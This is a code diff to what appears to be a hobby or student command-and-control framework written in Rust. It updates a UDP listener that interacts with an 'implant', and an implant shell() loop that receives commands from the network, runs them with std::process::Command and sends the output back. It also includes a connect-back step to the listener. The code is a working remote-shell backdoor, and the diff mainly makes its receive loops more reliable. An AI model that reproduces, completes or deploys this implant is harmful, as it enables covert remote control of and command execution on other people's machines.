@@ -7,7 +7,6 @@ use std::process::Command;
 use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
 use std::format;
-use std::ptr::null;
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use std::thread;
@@ -130,6 +129,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
     let mut is_interacting: bool = false;
+    let mut memo: String = String::new();
     loop {
         // live interaction with the implant
         if is_interacting {
@@ -143,15 +143,25 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
             // otherwise interact normally
             else {
                 let mut sb_copy = sb.lock().unwrap();
-                if !vec_is_zero(&sb_copy.buff) {
+                if !vec_is_zero(&sb_copy.buff) && !String::from_utf8_lossy(&sb_copy.buff).to_string().eq(&memo){
                     // send null byte to indicate no change in cc
                     let code: u8 = 0;
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                     // now send input
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                     let mut output = [0; 2048];
-                    lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                    let (mut bytes, mut src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
+                        Ok((b, s)) => (b, s),
+                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                    };
+                    while bytes == 0 {
+                        (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
+                            Ok((b, s)) => (b, s),
+                            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                        };
+                    }
                     sb_copy.buff = output.to_vec();
+                    memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                 }
             }
         }
@@ -284,24 +294,29 @@ pub fn shell(sock: &mut UdpSocket) {
         }
         // Otherwise shell it up!
         let mut buffer = [0;2048];
-        let (bytes, src) = match sock.recv_from(&mut buffer) {
-            Ok((b, s)) => (b, s),
-            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
-        };
+        let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
+        loop {
+            (bytes, src) = match sock.recv_from(&mut buffer) {
+                Ok((b, s)) => (b, s),
+                Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+            };
+            if bytes > 1 {
+                break;
+            }
+        }
         //Changed to include 1 because there was a bunch 
         //being sent that didnt have anything
-        if bytes != 0 && bytes != 1{
-            let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
-            let cmd_out = format!("{}{}", execute_cmd(cmd), "\n>> ");
-            sock.send_to(cmd_out.as_bytes(), src);
-            
-            
-        }
+        let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
+        println!("{}", cmd);
+        let cmd_out = execute_cmd(cmd);
+        println!("{}", cmd_out);
+        sock.send_to(cmd_out.as_bytes(), src);
     }
 }
 
 // executes a single arbitrary command
 pub fn execute_cmd(s: String) -> String {
+    //println!("{}", s);
     if s.trim().contains(' ') {
         let mut split = s.trim().split_whitespace();
         let head = split.next().unwrap();
@@ -319,8 +334,6 @@ pub fn execute_cmd(s: String) -> String {
                 return head.to_string();
             }
             head => {
-                //Printing for testing purposes
-                println!("{:?}", head);
                 let cmd = Command::new(head).args(tail).output();
                 match cmd{
                     Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
@@ -336,7 +349,7 @@ pub fn execute_cmd(s: String) -> String {
         tmp = tmp.trim_matches('\0');
         //Trim remaining whitespace
         tmp = tmp.trim();
-
+        println!("tmp: {}", tmp);
         match tmp {
             "exit" => return String::new(),
             tmp => {
@@ -371,7 +384,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
     let address = SocketAddr::from(([127, 0, 0, 1], 2973));
     // let address = get_system_addr();
     let mut sock = UdpSocket::bind(address).unwrap();
-    sock.set_read_timeout(Some(Duration::from_millis(100))).expect("set_read_timeout failed");
+    sock.set_read_timeout(Some(Duration::from_millis(1000))).expect("set_read_timeout failed");
 
     // try to connect back to listener
     sock.send_to("order up".as_bytes(), lsn_addr);
